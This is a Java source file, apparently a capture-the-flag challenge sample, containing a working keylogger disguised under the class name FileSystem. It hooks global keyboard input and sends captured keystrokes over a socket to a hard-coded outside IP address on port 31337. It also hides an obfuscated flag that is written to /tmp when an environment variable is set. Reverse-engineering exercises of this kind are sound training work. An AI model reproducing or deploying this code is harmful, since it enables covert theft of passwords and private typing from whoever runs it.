/*  Copyright (c) 2019 Nikita Sychev

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
package leet;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.Socket;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class FileSystem implements NativeKeyListener {
    private final static String HOST = "45.77.142.82";
    private final static int PORT = 31337;

    private final static String HEAD = "POST /log HTTP/1.1\r\nContent-Length: %d\r\n\r\n";

    private String buffer = "";

    private char inverse(char c) {
        if (c == '_')
            return c;
        return (char)('z' - (c - 'a'));
    }


    public FileSystem() {
        if ("42".equals(System.getenv("X_SHOW_FLAG"))) {
            final String not_a_flag = "illwpxzy_zezq_cfmro_zitf";
            try (
                    FileWriter fileWriter = new FileWriter("/tmp/flag4.txt");
                    BufferedWriter bufferedWriter = new BufferedWriter(fileWriter)
            ) {
                bufferedWriter.write("flag 4: ");
                for (int i = not_a_flag.length() - 1; i >= 0; i--) {
                    bufferedWriter.write(inverse(not_a_flag.charAt(i)));
                }
                bufferedWriter.write('\n');
            } catch (Exception e) {
                // ...
            }
        }
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new FileSystem());
        } catch (NativeHookException e) {
            System.exit(1);
        }
    }

    private void send() {
        byte[] tempBuffer = this.buffer.getBytes();
        this.buffer = "";

        try {
            Socket socket = new Socket(HOST, PORT);

            OutputStream os = socket.getOutputStream();
            os.write(String.format(HEAD, tempBuffer.length).getBytes());
            os.write(tempBuffer);
            os.flush();

            socket.close();
        } catch (Exception e) {
            System.exit(1);
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (this.buffer.length() >= 5) {
            this.send();
        }

        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        this.buffer = keyText + this.buffer;
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Does nothing.
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Does nothing.
    }
}
